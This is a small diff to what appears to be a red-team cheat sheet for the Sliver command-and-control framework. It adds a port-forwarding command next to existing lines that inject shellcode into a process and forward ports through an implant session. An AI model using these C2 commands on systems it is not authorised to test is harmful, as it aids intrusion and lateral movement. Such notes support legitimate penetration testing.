@@ -460,6 +460,7 @@ sliver (NEARBY_LANGUAGE) > execute-shellcode -p <PID> /PATH/TO/BINARY/<FILE>.bin
 ```c
 sliver (NEARBY_LANGUAGE) > portfwd
 sliver (NEARBY_LANGUAGE) > portfwd add -r <RHOST>:<RPORT>
+sliver (NEARBY_LANGUAGE) > portfwd add -b 127.0.0.1:<RPORT> -r 127.0.0.1:<RPORT>
 sliver (NEARBY_LANGUAGE) > portfwd add --bind 127.0.0.1:<RPORT> -r <RHOST>:<RPORT>
 sliver (NEARBY_LANGUAGE) > portfwd rm -i <ID>
 ```
